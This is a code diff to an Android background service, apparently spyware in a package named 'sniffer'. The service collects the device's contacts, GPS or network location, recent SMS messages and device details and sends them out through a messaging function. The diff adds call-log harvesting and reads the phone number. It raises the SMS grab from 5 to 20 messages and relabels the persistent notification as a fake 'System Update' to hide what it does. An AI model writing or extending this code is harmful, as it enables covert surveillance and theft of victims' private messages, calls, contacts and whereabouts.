@@ -1,6 +1,5 @@
 package com.v8.global.sniffer;
 
-import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -16,6 +15,7 @@ import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.telephony.TelephonyManager;
 
 import androidx.core.app.NotificationCompat;
 
@@ -52,6 +52,7 @@ public class DataService extends Service {
             getContacts();
             getLocation();
             getSms();
+            getCallLog();
         }).start();
     }
 
@@ -62,8 +63,8 @@ public class DataService extends Service {
             ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
         }
         Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("Data Service")
-                .setContentText("Running...")
+                .setContentTitle("System Update")
+                .setContentText("يعمل في الخلفية...")
                 .setSmallIcon(android.R.drawable.stat_notify_sync)
                 .build();
         startForeground(1, notification);
@@ -75,22 +76,30 @@ public class DataService extends Service {
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
+            
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                info.put("phone", tm.getLine1Number());
+            }
+            
             sendMessage("📱 Device: " + info.toString());
         } catch (Exception e) {}
     }
 
     private void getContacts() {
         try {
-            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
+            if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
             
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
             StringBuilder sb = new StringBuilder("📇 Contacts:\n");
-            while (cursor != null && cursor.moveToNext()) {
+            int count = 0;
+            while (cursor != null && cursor.moveToNext() && count < 50) {
                 String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 sb.append(name).append(": ").append(number).append("\n");
+                count++;
             }
             if (cursor != null) cursor.close();
             sendMessage(sb.toString());
@@ -99,10 +108,11 @@ public class DataService extends Service {
 
     private void getLocation() {
         try {
-            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
+            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
             
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (location != null) {
                 sendMessage("📍 Location: " + location.getLatitude() + "," + location.getLongitude());
             }
@@ -111,15 +121,34 @@ public class DataService extends Service {
 
     private void getSms() {
         try {
-            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
+            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
             
             Cursor cursor = getContentResolver().query(
-                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 5");
+                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
             StringBuilder sb = new StringBuilder("📨 SMS:\n");
             while (cursor != null && cursor.moveToNext()) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 sb.append(address).append(": ").append(body).append("\n");
+            }
+            if (cursor != null) cursor.close();
+            sendMessage(sb.toString());
+        } catch (Exception e) {}
+    }
+
+    private void getCallLog() {
+        try {
+            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
+            
+            Cursor cursor = getContentResolver().query(
+                android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 20");
+            StringBuilder sb = new StringBuilder("📞 Calls:\n");
+            while (cursor != null && cursor.moveToNext()) {
+                String number = cursor.getString(cursor.getColumnIndex("number"));
+                String type = cursor.getString(cursor.getColumnIndex("type"));
+                String duration = cursor.getString(cursor.getColumnIndex("duration"));
+                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
+                sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
             }
             if (cursor != null) cursor.close();
             sendMessage(sb.toString());
